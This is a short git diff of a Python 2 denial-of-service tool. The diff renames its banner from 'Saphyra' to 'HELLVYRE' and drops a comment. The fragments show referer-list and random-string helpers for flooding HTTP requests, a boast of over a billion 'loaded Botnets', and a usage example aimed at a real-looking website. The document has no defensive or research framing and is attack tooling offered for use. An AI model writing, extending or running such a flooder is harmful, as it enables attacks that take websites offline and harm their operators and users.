@@ -3389,7 +3389,6 @@ def referer_list():
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
-#builds random ascii string
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
@@ -3398,10 +3397,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'Saphyra DDoS Tool ( individual Dangerous Denial of Service )'
+	print 'HELLVYRE DDoS Tool ( individual Dangerous Denial of Service )'
 	print 'New loaded Botnets: 1,798,445,657'
-	print 'Usage: Saphyra (url)'
-	print 'Example: Saphyra.py http://luthi.co.il/'
+	print 'Usage: HELLVYRE (url)'
+	print 'Example: HELLVYRE.py http://luthi.co.il/'
 	print "\a"
 print \
 """
